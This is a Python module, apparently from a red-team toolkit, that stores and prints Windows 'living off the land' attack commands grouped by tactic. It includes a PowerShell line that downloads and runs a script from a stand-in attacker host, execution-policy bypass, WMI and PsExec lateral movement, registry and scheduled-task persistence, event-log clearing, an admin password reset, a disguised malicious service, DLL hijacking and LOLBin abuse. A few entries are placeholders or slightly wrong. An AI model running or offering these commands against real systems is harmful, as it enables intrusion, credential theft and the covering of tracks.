"""LotL — Living Off The Land techniques using built-in Windows tools.

Advanced red team tactics using native Windows binaries to avoid detection.
"""

from modules.tools import render

DESCRIPTION = 'Living off the Land - Windows native tool exploitation'


def is_installed():
    """LotL techniques are always available on Windows systems."""
    return True


def ready():
    """LotL is always ready - uses built-in Windows tools."""
    return True, "built-in (Windows native tools)"


def powershell_tactics():
    """PowerShell-based attack techniques."""
    return {
        'execution': {
            'bypass_execution_policy': 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process',
            'encoded_command': 'powershell -EncodedCommand <base64_payload>',
            'remote_download_execute': 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
        },
        'lateral_movement': {
            'psremoting': 'Invoke-Command -ComputerName target -ScriptBlock {command}',
            'wmi_execute': 'Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName target -ArgumentList "cmd.exe"'
        },
        'credential_extraction': {
            'lsass_dump': '$proc = Get-Process lsass; [System.Diagnostics.Process]::GetCurrentProcess()',
            'credential_vault': 'Get-VaultCredential -TargetName "*"'
        },
        'persistence': {
            'registry_run': 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\Run" -Name "Backup" -Value "cmd.exe /c powershell.exe"',
            'scheduled_task': 'New-ScheduledTask -TaskName "UpdateCheck" -Trigger (New-ScheduledTaskTrigger) -Action (New-ScheduledTaskAction)'
        }
    }


def cmd_tactics():
    """Command Prompt (cmd.exe) based techniques."""
    return {
        'remote_execution': 'psexec \\\\target cmd.exe',
        'file_operations': 'copy, move, del with /s /f /q flags',
        'network_recon': 'ipconfig, route print, netstat -ano, wmic logicaldisk get name',
        'process_management': 'tasklist, taskkill /pid <pid> /f, wmic process call create',
        'event_logs': 'wevtutil.exe cl System /quiet'
    }


def wmic_tactics():
    """WMI Command-line (wmic) exploitation."""
    return {
        'process_execution': 'wmic process call create "cmd.exe /c malicious_command"',
        'service_creation': 'wmic service call create name="MalService" displayname="Legitimate Service"',
        'user_creation': 'wmic useraccount where name="admin" call setpassword newpassword="P@ssw0rd"',
        'reboot': 'wmic os call reboot',
        'system_info': 'wmic os get version, wmic logicaldisk get name'
    }


def dll_hijacking():
    """DLL hijacking and sideloading techniques."""
    return {
        'method': 'Place malicious DLL in application path',
        'search_order': '1. Current directory, 2. System directory, 3. Windows directory, 4. PATH',
        'tools_vulnerable': [
            'Microsoft Office',
            'Adobe Reader',
            'Google Chrome/Chromium',
            'Visual Studio'
        ],
        'detection_bypass': 'Use legitimate applications to load malicious DLLs'
    }


def registry_persistence():
    """Windows Registry persistence methods."""
    return {
        'run_keys': 'HKLM\\Software\\Microsoft\\Windows\\Run',
        'runonce': 'HKLM\\Software\\Microsoft\\Windows\\RunOnce',
        'userinit': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'shell_execute': 'HKCU\\Software\\Microsoft\\Windows\\Run\\Shell',
        'logon_scripts': 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'
    }


def signed_binary_abuse():
    """Abuse of legitimate signed Windows binaries (LOLBins)."""
    return {
        'regsvcs.exe': 'Execute arbitrary code during .NET class registration',
        'regasm.exe': 'Execute .NET assemblies via COM registration',
        'msdt.exe': 'Diagnostic tool execution with remote code',
        'certutil.exe': 'Certificate utility - downloads and executes files',
        'mshta.exe': 'HTML Application host - execute HTA scripts',
        'rundll32.exe': 'Execute DLL exports',
        'csc.exe': 'C# compiler - compile and execute code inline',
        'notepad.exe': 'Image hijacking via registry for arbitrary execution'
    }


def techniques_summary():
    """Summary of all LotL techniques."""
    return {
        'execution': 'PowerShell, cmd.exe, WMI, scheduled tasks',
        'persistence': 'Registry keys, scheduled tasks, startup folders, services',
        'privilege_escalation': 'UAC bypass, token impersonation, kernel exploits',
        'lateral_movement': 'PSRemoting, WMI, credential reuse, token delegation',
        'defense_evasion': 'DLL hijacking, code signing bypass, API hooking removal',
        'credential_access': 'LSASS dumping, registry credential extraction, Kerberos',
        'exfiltration': 'DNS tunneling, HTTP/HTTPS, DNS-over-HTTPS'
    }


def cli(args):
    """CLI: lotl_techniques [powershell | cmd | lolbins]"""
    if args and args[0] == 'powershell':
        result = powershell_tactics()
    elif args and args[0] == 'cmd':
        result = cmd_tactics()
    elif args and args[0] == 'lolbins':
        result = signed_binary_abuse()
    else:
        result = techniques_summary()
    text, code = render(result)
    print(text)
    return code
